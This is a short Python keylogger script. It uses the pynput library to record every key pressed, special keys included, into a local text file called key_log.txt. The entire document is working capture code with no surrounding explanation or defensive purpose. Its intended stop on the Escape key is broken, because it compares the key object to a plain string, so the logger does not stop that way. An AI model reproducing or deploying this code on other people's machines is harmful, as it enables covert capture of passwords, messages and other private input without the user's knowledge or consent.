from pynput.keyboard import Listener

# Path to save the log file
log_file_path = "key_log.txt"

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        # Log the key pressed (handles special keys like 'space', 'enter')
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # If a special key is pressed, log its name
        with open(log_file_path, "a") as log_file:
            log_file.write(f"[{key}]")

# This function will be called when a key is released
def on_release(key):
    # Optionally, stop the keylogger if a specific key is released
    if key == 'esc':
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
